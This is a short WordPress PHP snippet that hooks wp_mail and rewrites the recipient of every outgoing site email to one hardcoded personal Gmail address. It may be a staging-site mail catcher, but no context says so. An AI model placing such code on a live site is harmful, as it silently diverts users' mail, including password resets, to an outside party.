<?php 
add_filter('wp_mail','wc_wp_mail', 9999,1);
function wc_wp_mail( $args )
{
  $args['to'] = 'PardeepSinghBatth@gmail.com';
  return $args;
}